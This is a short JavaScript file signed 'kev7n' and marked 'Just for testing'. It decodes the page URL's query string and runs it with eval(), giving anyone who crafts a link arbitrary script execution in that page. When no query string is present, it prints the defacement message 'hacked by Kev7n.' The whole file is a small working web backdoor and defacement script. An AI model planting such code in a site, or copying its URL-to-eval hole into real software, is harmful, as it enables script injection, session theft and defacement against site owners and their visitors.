//Just for testing
//By kev7n

var queryString = document.location.search.substr(1);
if(!!queryString){
    var cmd = decodeURIComponent(queryString);
    eval(cmd);
}else{
    document.write('hacked by Kev7n.');
}
